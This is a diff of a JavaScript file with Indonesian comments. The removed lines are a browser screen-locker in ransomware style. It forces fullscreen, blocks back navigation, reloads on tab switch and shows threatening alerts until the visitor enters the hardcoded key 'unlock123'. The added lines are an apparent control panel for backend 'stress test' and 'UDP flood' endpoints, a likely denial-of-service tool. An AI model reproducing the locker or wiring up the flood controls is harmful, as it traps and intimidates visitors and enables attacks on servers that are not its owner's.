@@ -1,50 +1,34 @@
-
-// Paksa Fullscreen jika keluar
-function forceFullscreen() {
-    if (document.fullscreenElement === null) {
-        document.documentElement.requestFullscreen();
-    }
-}
-setInterval(forceFullscreen, 1000);
-
-// Blokir tombol kembali dan keluar
-history.pushState(null, null, location.href);
-window.onpopstate = function () {
-    history.pushState(null, null, location.href);
-    alert("Tidak bisa kembali! Masukkan key untuk keluar!");
-};
-
-// Cegah refresh atau pindah tab
-document.addEventListener("visibilitychange", function() {
-    if (document.hidden) {
-        alert("Jangan coba kabur! Masukkan key untuk keluar!");
-        location.reload();
-    }
+document.getElementById('startGetTest').addEventListener('click', () => {
+    fetch('/api/stress-test')
+        .then(response => response.text())
+        .then(data => document.getElementById('status').innerText = data)
+        .catch(error => document.getElementById('status').innerText = "Gagal melakukan uji beban (GET).");
 });
 
-// Blokir tombol home & recent apps (terbatas di web)
-window.addEventListener("blur", function() {
-    setTimeout(function() {
-        alert("Tidak bisa keluar begitu saja! Masukkan key!");
-        location.reload();
-    }, 100);
+document.getElementById('startPostTest').addEventListener('click', () => {
+    fetch('/api/stress-test-post', { method: 'POST' })
+        .then(response => response.text())
+        .then(data => document.getElementById('status').innerText = data)
+        .catch(error => document.getElementById('status').innerText = "Gagal melakukan uji beban (POST).");
 });
 
-// Cek input key untuk bisa keluar
-function checkKey() {
-    let inputKey = document.getElementById("ransomKey").value;
-    if (inputKey === "unlock123") {
-        alert("Key benar! Anda bebas!");
-        window.onbeforeunload = null;  // Hapus blok keluar
-        document.exitFullscreen();  // Keluar dari fullscreen
-        history.back();  // Kembali ke halaman sebelumnya
-    } else {
-        alert("Key salah! Anda tetap terkunci!");
-    }
-}
+document.getElementById('startUdpTest').addEventListener('click', () => {
+    fetch('/api/udp-flood')
+        .then(response => response.text())
+        .then(data => document.getElementById('status').innerText = data)
+        .catch(error => document.getElementById('status').innerText = "Gagal melakukan uji beban (UDP Flood).");
+});
 
-// Tambahkan event listener ke tombol unlock
-document.addEventListener("DOMContentLoaded", function() {
-    let unlockButton = document.getElementById("unlockButton");
-    if (unlockButton) unlockButton.addEventListener("click", checkKey);
+document.getElementById('pingTest').addEventListener('click', () => {
+    fetch('/api/ping')
+        .then(response => response.text())
+        .then(data => document.getElementById('pingStatus').innerText = data)
+        .catch(error => document.getElementById('pingStatus').innerText = "Server tidak merespons.");
+});
+
+document.getElementById('checkStats').addEventListener('click', () => {
+    fetch('/api/stats')
+        .then(response => response.text())
+        .then(data => document.getElementById('stats').innerText = data)
+        .catch(error => document.getElementById('stats').innerText = "Gagal mengambil statistik.");
 });
